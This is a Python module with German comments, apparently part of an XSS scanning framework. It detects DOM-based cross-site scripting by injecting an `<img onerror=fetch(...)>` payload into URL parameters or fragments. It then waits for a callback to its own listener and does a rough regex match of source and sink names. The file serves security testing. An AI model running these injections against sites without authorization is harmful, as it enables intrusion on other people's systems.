#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - DOM XSS Detector
=======================================

Dieses Modul ist verantwortlich für:
1. Erkennung von DOM-basierten XSS-Schwachstellen
2. Analyse von JavaScript-Code auf DOM-XSS-Schwachstellen
3. Instrumentierung von JavaScript für DOM-XSS-Erkennung

Autor: Anonymous
Lizenz: MIT
Version: 0.3.2
"""

import logging
import re
import json
import os
import random
import string
import time
from typing import Dict, List, Any, Optional, Tuple

# Konfiguration für Logging
logger = logging.getLogger("XSSHunterPro.DOMXSSDetector")

class DOMXSSDetector:
    """Erkennt DOM-basierte XSS-Schwachstellen in Webanwendungen."""

    def __init__(self, config: Dict[str, Any] = None, browser=None, callback_server=None):
        """
        Initialisiert den DOM-XSS-Detektor.

        Args:
            config: Ein Dictionary mit Konfigurationsoptionen.
            browser: Eine Instanz des Browsers für die DOM-Manipulation.
            callback_server: Eine Instanz des Callback-Servers für die Erkennung.
        """
        self.config = config or {}
        self.browser = browser
        self.callback_server = callback_server
        self.sinks = self._load_dom_sinks()
        self.sources = self._load_dom_sources()
        
        logger.info("DOM-XSS-Detektor initialisiert")

    def _load_dom_sinks(self) -> List[str]:
        """
        Lädt die DOM-Sinks aus der Konfiguration oder verwendet Standardwerte.

        Returns:
            Eine Liste von DOM-Sinks.
        """
        default_sinks = [
            "document.write",
            "innerHTML",
            "outerHTML",
            "eval",
            "setTimeout",
            "setInterval",
            "location",
            "location.href",
            "location.replace",
            "document.cookie",
            "document.domain",
            "element.src",
            "element.setAttribute"
        ]
        
        return self.config.get("dom_sinks", default_sinks)

    def _load_dom_sources(self) -> List[str]:
        """
        Lädt die DOM-Sources aus der Konfiguration oder verwendet Standardwerte.

        Returns:
            Eine Liste von DOM-Sources.
        """
        default_sources = [
            "location",
            "location.href",
            "location.search",
            "location.hash",
            "document.URL",
            "document.documentURI",
            "document.referrer",
            "window.name",
            "history.state",
            "localStorage",
            "sessionStorage"
        ]
        
        return self.config.get("dom_sources", default_sources)

    def detect_dom_xss(self, url: str, param: str = None, payload: str = None) -> Dict[str, Any]:
        """
        Erkennt DOM-basierte XSS-Schwachstellen in einer URL.

        Args:
            url: Die zu testende URL.
            param: Der zu testende Parameter (optional).
            payload: Der zu verwendende Payload (optional).

        Returns:
            Ein Dictionary mit den Ergebnissen der Erkennung.
        """
        logger.info(f"Starte DOM-XSS-Erkennung für URL: {url}")
        
        # Initialisiere das Ergebnis
        result = {
            "url": url,
            "param": param,
            "payload": payload,
            "success": False,
            "evidence": None,
            "vulnerable_code": None,
            "source": None,
            "sink": None,
            "error": None
        }
        
        try:
            # Überprüfe, ob der Browser verfügbar ist
            if not self.browser:
                logger.error("Browser nicht verfügbar für DOM-XSS-Erkennung")
                result["error"] = "Browser nicht verfügbar"
                return result
            
            # Generiere ein Token für den Callback
            token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            
            # Erstelle den Payload, falls keiner angegeben wurde
            if not payload:
                callback_url = f"http://{self.callback_server.host}:{self.callback_server.port}/c/{token}"
                payload = f"<img src=x onerror=fetch('{callback_url}')>"
            
            # Erstelle die URL mit dem Payload
            if param:
                # Füge den Payload zum Parameter hinzu
                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                query_params[param] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                
                new_url_parts = list(parsed_url)
                new_url_parts[4] = new_query
                test_url = urlunparse(new_url_parts)
            else:
                # Füge den Payload zur URL hinzu (z.B. als Fragment)
                test_url = f"{url}#{payload}"
            
            # Navigiere zur URL
            response = self.browser.get(test_url)
            
            # Überprüfe, ob die Anfrage erfolgreich war
            if response.get("status_code", 0) == 0:
                logger.error(f"Fehler bei der Anfrage: {response.get('error')}")
                result["error"] = response.get("error")
                return result
            
            # Warte auf einen Callback
            if self.callback_server:
                success, evidence = self._wait_for_callback(token)
                
                if success:
                    result["success"] = True
                    result["evidence"] = evidence
                    
                    # Versuche, die Quelle und Senke zu identifizieren
                    source, sink = self._identify_source_and_sink(response.get("content", ""))
                    result["source"] = source
                    result["sink"] = sink
                    
                    logger.info(f"DOM-XSS-Schwachstelle gefunden: {url}")
                    return result
            
            # Führe JavaScript-Analyse durch
            js_analysis = self._analyze_javascript(response.get("content", ""))
            
            if js_analysis["vulnerable"]:
                result["success"] = True
                result["vulnerable_code"] = js_analysis["vulnerable_code"]
                result["source"] = js_analysis["source"]
                result["sink"] = js_analysis["sink"]
                
                logger.info(f"DOM-XSS-Schwachstelle durch statische Analyse gefunden: {url}")
            
        except Exception as e:
            logger.error(f"Fehler bei der DOM-XSS-Erkennung: {e}")
            result["error"] = str(e)
        
        return result

    def _wait_for_callback(self, token: str, timeout: int = 5) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """
        Wartet auf einen Callback vom Callback-Server.

        Args:
            token: Das Token für den Callback.
            timeout: Das Timeout in Sekunden.

        Returns:
            Ein Tupel mit einem Boolean, der angibt, ob der Callback empfangen wurde,
            und einem Dictionary mit den Callback-Daten.
        """
        if not self.callback_server or not self.callback_server.is_running():
            logger.warning("Callback-Server nicht verfügbar")
            return False, None
        
        # Warte auf den Callback
        start_time = time.time()
        while time.time() - start_time < timeout:
            if token in self.callback_server.callbacks:
                # Callback empfangen
                data = self.callback_server.callback_data.get(token)
                return True, data
            
            # Kurze Pause, um CPU-Last zu reduzieren
            time.sleep(0.1)
        
        # Timeout erreicht
        return False, None

    def _analyze_javascript(self, html_content: str) -> Dict[str, Any]:
        """
        Analysiert JavaScript-Code auf DOM-XSS-Schwachstellen.

        Args:
            html_content: Der HTML-Inhalt mit JavaScript-Code.

        Returns:
            Ein Dictionary mit den Ergebnissen der Analyse.
        """
        result = {
            "vulnerable": False,
            "vulnerable_code": None,
            "source": None,
            "sink": None
        }
        
        # Extrahiere JavaScript-Code aus dem HTML
        js_code = self._extract_javascript(html_content)
        
        # Suche nach DOM-Sources
        for source in self.sources:
            if source in js_code:
                # Suche nach DOM-Sinks
                for sink in self.sinks:
                    if sink in js_code:
                        # Versuche, den verwundbaren Code zu extrahieren
                        pattern = rf".*{re.escape(source)}.*{re.escape(sink)}.*"
                        matches = re.findall(pattern, js_code, re.MULTILINE | re.DOTALL)
                        
                        if matches:
                            result["vulnerable"] = True
                            result["vulnerable_code"] = matches[0]
                            result["source"] = source
                            result["sink"] = sink
                            
                            logger.info(f"Potenziell verwundbarer DOM-XSS-Code gefunden: {source} -> {sink}")
                            return result
        
        return result

    def _extract_javascript(self, html_content: str) -> str:
        """
        Extrahiert JavaScript-Code aus HTML-Inhalt.

        Args:
            html_content: Der HTML-Inhalt.

        Returns:
            Der extrahierte JavaScript-Code.
        """
        # Extrahiere <script>-Tags
        script_pattern = r"<script[^>]*>(.*?)</script>"
        script_matches = re.findall(script_pattern, html_content, re.MULTILINE | re.DOTALL)
        
        # Extrahiere Event-Handler
        event_pattern = r"on\w+=['\"]([^'\"]*)['\"]"
        event_matches = re.findall(event_pattern, html_content)
        
        # Kombiniere alle JavaScript-Code-Fragmente
        js_code = "\n".join(script_matches + event_matches)
        
        return js_code

    def _identify_source_and_sink(self, html_content: str) -> Tuple[Optional[str], Optional[str]]:
        """
        Identifiziert die Quelle und Senke einer DOM-XSS-Schwachstelle.

        Args:
            html_content: Der HTML-Inhalt.

        Returns:
            Ein Tupel mit der identifizierten Quelle und Senke.
        """
        js_analysis = self._analyze_javascript(html_content)
        
        return js_analysis["source"], js_analysis["sink"]

# Wenn dieses Skript direkt ausgeführt wird
if __name__ == "__main__":
    # Konfiguriere Logging
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    
    # Teste den DOM-XSS-Detektor
    from browser_abstraction import BrowserFactory
    from modules.xss_validator import CallbackServer
    
    # Erstelle einen Browser
    browser = BrowserFactory.create_browser()
    
    # Erstelle einen Callback-Server
    callback_server = CallbackServer()
    callback_server.start()
    
    # Erstelle einen DOM-XSS-Detektor
    detector = DOMXSSDetector(browser=browser, callback_server=callback_server)
    
    # Teste eine URL
    result = detector.detect_dom_xss(
        url="https://example.com/vulnerable.html#<img src=x onerror=alert(1)>",
    )
    
    print(json.dumps(result, indent=4))
    
    # Schließe den Callback-Server
    callback_server.stop()
